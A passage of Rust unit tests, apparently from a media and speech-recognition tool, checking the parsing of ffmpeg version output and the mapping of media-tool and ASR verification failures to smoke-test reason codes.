            first_line(b"ffmpeg version n9 Copyright\r\nbuilt with gcc\n"),
            "ffmpeg version n9 Copyright"
        );
        assert_eq!(first_line(b""), "");
    }

    #[test]
    fn verifier_failures_map_to_smoke_reasons() {
        assert_eq!(
            media_reason(MediaToolFailure::UnexpectedResult),
            Reason::FixtureMismatch
        );
        assert_eq!(
            media_reason(MediaToolFailure::Deadline),
            Reason::DeadlineExceeded
        );
        assert_eq!(
            media_reason(MediaToolFailure::OutputLimit),
            Reason::OutputOverBound
        );
        assert_eq!(
            media_reason(MediaToolFailure::Workspace),
            Reason::Preparation
        );
        assert_eq!(
            speech_reason(LocalAsrVerificationFailure::UnexpectedTranscript),
            Reason::FixtureMismatch
        );
        assert_eq!(
            speech_reason(LocalAsrVerificationFailure::Transcription(AsrFailure {
                stage: AsrStage::Recognition,
                reason: vsift_application::AsrFailureReason::ResourceLimit,
            })),
            Reason::OutputOverBound
        );
    }
}
